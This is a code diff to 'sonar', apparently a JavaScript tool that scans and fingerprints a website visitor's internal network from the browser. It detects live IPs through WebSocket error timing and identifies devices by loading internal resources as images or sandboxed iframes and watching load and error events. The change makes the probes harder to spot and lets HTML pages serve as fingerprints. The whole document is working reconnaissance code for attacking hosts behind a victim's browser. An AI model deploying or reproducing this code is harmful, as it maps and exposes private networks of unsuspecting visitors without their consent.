@@ -121,7 +121,7 @@ var sonar = {
     'check_ip': function ( ip ){
         var done = false;
         var t1 = +new Date();
-        var socket = new WebSocket("ws://" + ip);
+        var socket = new WebSocket("ws://" + ip + '/' + sonar.generate_random_id() );
         socket.onerror = function(e){
             if(e.timeStamp - t1 < 10){
                 done = true;
@@ -215,7 +215,7 @@ var sonar = {
     },
 
     /*
-     * Internal host fingerprinting via SOP hacks
+     * Internal host fingerprinting via hooking onload and onerror. Even active content such as HTML pages and .js can be used here (as they are read via static iframes)
      */
     'check_resource_exists': function( resource, ip, id ) {
         var full_source = 'http://' + ip + resource;
@@ -230,12 +230,11 @@ var sonar = {
             var resourceref = document.createElement( "img" );
             resourceref.setAttribute( "id", element_id );
             resourceref.setAttribute( "src", full_source );
-        } else if ( resource.toLowerCase().endsWith( '.js' ) ) {
-            var resourceref = document.createElement( "script" );
-            resourceref.setAttribute( "id", "testresource" );
-            resourceref.setAttribute( "src", full_source );
         } else {
-            return false;
+            var resourceref = document.createElement( "iframe" );
+            resourceref.setAttribute( "id", element_id );
+            resourceref.setAttribute( "src", full_source );
+            resourceref.setAttribute( "sandbox", "" );
         }
         resourceref.addEventListener( "error", function( event ) {
             document.getElementById( element_id ).remove();
